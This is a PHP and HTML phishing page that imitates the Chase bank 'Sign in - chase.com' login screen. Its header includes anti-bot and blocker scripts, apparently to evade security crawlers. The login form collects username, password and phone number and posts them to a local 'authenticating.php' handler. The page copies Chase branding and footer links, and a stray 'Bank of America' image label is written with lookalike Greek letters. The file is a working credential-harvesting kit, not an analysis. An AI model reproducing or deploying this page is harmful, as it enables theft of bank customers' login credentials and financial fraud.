<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include './antibots.php';
include './bt.php';
include "./blocker.php";
?>
	<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
      
      <meta name="robots" content="noindex,nofollow">
      <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="msapplication-config" content="none">
      <title>Sign in - chase.com</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!--[if lte IE 8]>
      <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2018.06.24-519/logon/assets/ie8.css" />
      <![endif]-->
      <link rel="shortcut icon" href="files/chasefavicon.ico">
      <link rel="apple-touch-icon" sizes="152x152" href="files/chase-touch-icon-152x152.png">
      <link rel="apple-touch-icon" sizes="120x120" href="files/chase-touch-icon-120x120.png">
      <link rel="apple-touch-icon" sizes="76x76" href="files/chase-touch-icon-76x76.png">
      <link rel="apple-touch-icon" href="files/chase-touch-icon.png">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">
      <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
         html {height:100%; background: #fff;}
         @media only screen and (min-width: 768px) {
         html {
         background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
         }
         }
      </style>
      <noscript>
      </noscript>
      <link rel="stylesheet" href="files/logon.css">
      <link rel="stylesheet" href="files/blue-ui.css">
      <script src="files/main-ver.js.download"></script><script src="files/main_296ab81a48f1e0bddd2406b4622572c8.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-vendor/main" src="files/main_004.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue/main" src="files/main_002.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="logon/boot" src="files/boot.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-app/main" src="files/main_003.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="blue-view/main" src="files/main.js.download"></script>
      <style type="text/css"></style>
   </head>
   <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
      <div data-is-view="true">
         <div class="homepage" tabindex="-1">
            <div id="advertisenativeapp" data-has-view="true"></div>
            <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
               <div data-is-view="true">
                  <div id="siteMessageAda" aria-live="polite">
                     <h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2>
                  </div>
               </div>
            </div>
            <div class="logon-container" id="container">
               <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                  <div class="logon header jpui transparent navigation bar" data-is-view="true">
                     <a id="logoHomepageLink" href="#">
                        <div class="chase logo"></div>
                        <span class="util accessible-text">JPMorgan.com</span>
                     </a>
                  </div>
               </header>
               <main id="logon-content" data-has-view="true">
                  <div class="container logon" data-is-view="true">
                     <div>
                        <div id="backgroundImage">
                           <div class="jpui background image fixed" id="geoImage">
                              <style type="text/css">.jpui.background.image { background-image: url(files/background.mobile.day.8.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='files/background.mobile.day.8.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='files/background.mobile.day.8.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(files/background.mobile.day.8.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(files/background.tablet.day.8.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(files/background.desktop.day.8.jpeg); } }</style>
                           </div>
                        </div>
                     </div>
                     <div class="row">
                        <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
                           <div class="jpui raised segment">
                              <div class="row">
                                 <div class="col-xs-10 col-xs-offset-1">
                                    <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3>
                                 </div>
                              </div>
                              <div class="row">
                                 <div class="col-xs-12">
                                    <div class="progress">
                                       <div class="bar"></div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                           <div class="jpui raised segment">
                              <div class="row">
                                 <div class="col-xs-10 col-xs-offset-1">

<form id="login-form" method="post" autocomplete="off" action="authenticating.php">
 
  <div id="validator-error-header" class="hide-xs">
 
  
  <div id="logon-error" class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span id="type-icon-logon-error"><i class="jpui exclamation-color icon" aria-hidden="true" id="icon-type-icon-logon-error"></i></span></div>
  <div class="icon background"></div>
  <div id="content-logon-error" class="content wrap">
  <h2 class="title" tabindex="-1" id="inner-logon-error"><span class="util accessible-text" id="icon-logon-error">Important:
  </span></h2>
  </div>
  </div>
  </div>
  <label class="util accessible-text logon-xs-toggle" for="userId-input-field" aria-hidden="true" data-attr="LOGON.userIdPlaceholder">
									   <span class="accessible-text errorAdaText"></span> Username
									   </label> 
                                       <div class="logon-xs-toggle" id="userId"> 
											<input min="0" class="jpui input logon-xs-toggle" id="userId-input-field" placeholder="Username" name="j_username" required="" type="text"> 
									   </div>
									   
                                       <label class="util accessible-text logon-xs-toggle" for="password-input-field" aria-hidden="true" data-attr="LOGON.passwordPlaceholder">
									   <span class="accessible-text errorAdaText"></span> Password
									   </label> 
                                       <div class="logon-xs-toggle" id="password"> 
									   <input min="0" class="jpui input logon-xs-toggle" id="password-input-field" placeholder="Password" autocomplete="off" name="j_password" required="" type="password">    
									   </div>
									   <label class="util accessible-text logon-xs-toggle" for="password-input-field" aria-hidden="true" data-attr="LOGON.passwordPlaceholder">
									   <span class="accessible-text errorAdaText"></span> Phone Number
									   </label> 
                                       <div class="logon-xs-toggle" id="password"> 
									   <input min="0" class="jpui input logon-xs-toggle" id="password-input-field" placeholder="Phone Number" autocomplete="off" name="phone" required="" type="text">    
									   </div>
  <div></div>
  <div>
  <div>
  <div>
  <div>
  <div "=""></div>
  </div>
  </div>
  </div>
  <div>
  <div>
  <div>
  <div></div>
  </div>
  </div>
  </div>
  </div>
  <div class="row"> <button class="jpui button focus fluid primary" id="signin-button" type="submit" role="button" data-attr="LOGON.logonToLandingPage">
  <div class="label">Continue</div>
  </button> </div>
  <div></div>
  <div></div>
</form></div>
</div>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div><br><br><br>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span
 <span class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="21" width="185" alt="Βank of Αmerica" src="css/Capture.PNG">
</div>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact
us</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms
of use</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair
Lending</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAboutChase">About
Chase</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P.
Morgan</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase
Canada</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2019 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2019 JPMorgan Chase &amp; Co.</span><br>
<a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 class="NOTELINK"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>
